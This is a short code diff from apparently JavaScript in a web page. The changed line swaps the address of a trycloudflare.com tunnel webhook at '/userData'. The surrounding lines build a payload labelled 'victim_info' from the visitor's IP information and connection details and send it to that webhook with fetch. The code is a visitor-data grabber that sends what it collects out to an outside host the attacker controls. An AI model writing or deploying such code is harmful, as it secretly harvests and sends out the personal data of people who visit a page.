@@ -85,7 +85,7 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "https://sticker-info-flows-goods.trycloudflare.com/userData";
+                const webhookURL = "https://convert-hints-blocking-harm.trycloudflare.com/userData";
 
                 const payload = {'victim_info': ipinfo}; 
                 fetch(webhookURL, {
